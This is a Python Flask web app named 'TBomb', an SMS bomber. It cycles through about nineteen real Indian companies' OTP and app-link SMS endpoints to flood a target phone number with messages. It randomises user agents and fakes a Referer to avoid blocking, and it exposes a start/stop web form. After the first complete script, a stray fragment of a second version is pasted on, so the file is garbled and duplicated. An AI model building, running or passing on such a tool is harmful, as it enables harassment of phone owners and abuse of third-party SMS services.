import os
import time
import requests
import threading
import random
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# LIST OF USER AGENTS (Taaki request real mobile se lage)
# ==========================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

# ==========================================
# AAPKI PURANI APIS (Optimized List)
# ==========================================
SMS_APIS = [
    {"url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}", "method": "GET"},
    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={target}", "method": "GET"},
    {"url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "data": {"mobileoremail": "{target}"}},
    {"url": "https://www.frotels.com/appsendsms.php", "method": "POST", "data": {"mobno": "{target}"}},
    {"url": "https://www.gapoon.com/userSignup", "method": "POST", "data": {"mobile": "{target}"}},
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "data": {"mobile_number": "{target}"}},
    {"url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{target}", "method": "GET"},
    {"url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "data": {"phone_number": "{target}"}},
    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"contactNumber": "{target}"}},
    {"url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "data": {"contactNo": "{target}"}},
    {"url": "https://grofers.com/v2/accounts/", "method": "POST", "data": {"user_phone": "{target}"}},
    {"url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"mobileNum": "{target}"}},
    {"url": "https://www.cashify.in/api/cu01/v1/app-link?mn={target}", "method": "GET"},
    {"url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "data": {"phoneNumber": "{target}"}},
]

# Global Status
status_db = {"success": 0, "failed": 0, "running": False}

def get_headers():
    """Random headers taaki block hone ke chance kam ho"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Referer': 'https://google.com'
    }

def bomb_worker(target, count, delay):
    global status_db
    status_db["success"] = 0
    status_db["failed"] = 0
    status_db["running"] = True
    
    api_count = len(SMS_APIS)
    
    for i in range(count):
        if not status_db["running"]: break
        
        # Random API pick karein
        api = SMS_APIS[i % api_count]
        headers = get_headers()
        
        try:
            url = api["url"].format(target=target)
            
            if api["method"] == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:
                # Data formatting
                payload = {k: v.format(target=target) for k, v in api["data"].items()}
                response = requests.post(url, json=payload, headers=headers, timeout=5)
            
            # Check success strictly (200 OK or 201 Created)
            if response.status_code in [200, 201]:
                status_db["success"] += 1
            else:
                status_db["failed"] += 1
                
        except Exception as e:
            status_db["failed"] += 1
        
        time.sleep(delay)
    
    status_db["running"] = False

# ==========================================
# WEB INTERFACE (HTML)
# ==========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Fixed TBomb</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #eee; text-align: center; padding: 20px; }
        .box { background: #2d2d2d; max-width: 400px; margin: 20px auto; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { padding: 12px; margin: 10px 0; width: 90%; background: #333; border: 1px solid #444; color: white; border-radius: 5px; }
        button { padding: 12px; width: 95%; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-start { background: #28a745; color: white; }
        .btn-stop { background: #dc3545; color: white; }
        .status-box { margin-top: 20px; text-align: left; padding: 10px; background: #222; border-radius: 5px; }
        .stat-row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid #333; }
    </style>
</head>
<body>
    <div class="box">
        <h1>TBomb <span style="font-size: 14px; color: yellow;">(Testing)</span></h1>
        
        <input type="text" id="phone" placeholder="Enter Mobile (e.g. 9998887776)">
        <input type="number" id="count" placeholder="Count (Max 50)">
        <input type="number" id="delay" placeholder="Delay Seconds (e.g. 1)" step="0.5" value="1">
        
        <button class="btn-start" onclick="startBombing()">START</button>
        <button class="btn-stop" onclick="stopBombing()">STOP</button>

        <div class="status-box">
            <div class="stat-row"><span>Status:</span> <span id="run_status" style="color:orange">Idle</span></div>
            <div class="stat-row"><span>Sent (200 OK):</span> <span id="sc" style="color:#28a745">0</span></div>
            <div class="stat-row"><span>Failed:</span> <span id="fl" style="color:#dc3545">0</span></div>
        </div>
    </div>

    <script>
        function startBombing() {
            const phone = document.getElementById('phone').value;
            const count = document.getElementById('count').value;
            const delay = document.getElementById('delay').value;
            if(!phone || !count) { alert("Please fill details"); return; }
            
            fetch(`/start?target=${phone}&count=${count}&delay=${delay}`)
                .then(r => r.json())
                .then(d => alert(d.msg));
        }
        function stopBombing() { fetch('/stop').then(r => r.json()).then(d => alert(d.msg)); }
        
        setInterval(() => {
            fetch('/status').then(r => r.json()).then(data => {
                document.getElementById('sc').innerText = data.success;
                document.getElementById('fl').innerText = data.failed;
                document.getElementById('run_status').innerText = data.running ? "Running..." : "Stopped";
            });
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start')
def start():
    target = request.args.get('target')
    count = int(request.args.get('count', 10))
    delay = float(request.args.get('delay', 1))
    
    if count > 100: count = 100 # Limit lagaya taaki server crash na ho
    
    if not status_db["running"]:
        threading.Thread(target=bomb_worker, args=(target, count, delay)).start()
        return jsonify({"msg": "Started Bombing"})
    return jsonify({"msg": "Already running!"})

@app.route('/status')
def status():
    return jsonify(status_db)

@app.route('/stop')
def stop():
    status_db["running"] = False
    return jsonify({"msg": "Stopped"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))            const c = document.getElementById('count').value;
            const d = document.getElementById('delay').value;
            fetch(`/start?target=${p}&count=${c}&delay=${d}`);
        }
        function stop() { fetch('/stop'); }
        setInterval(() => {
            fetch('/status').then(r => r.json()).then(data => {
                document.getElementById('sc').innerText = data.success;
                document.getElementById('fl').innerText = data.failed;
                document.getElementById('tgt').innerText = data.target || "-";
                document.getElementById('run_status').innerText = data.running ? "BOMBING..." : "IDLE";
            });
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start')
def start_bomb():
    target = request.args.get('target')
    count = int(request.args.get('count', 10))
    delay = float(request.args.get('delay', 1.5))
    if target and not status_db["running"]:
        threading.Thread(target=bomb_worker, args=(target, count, delay)).start()
    return jsonify({"status": "processing"})

@app.route('/status')
def get_status():
    return jsonify(status_db)

@app.route('/stop')
def stop_bomb():
    status_db["running"] = False
    return jsonify({"status": "stopped"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
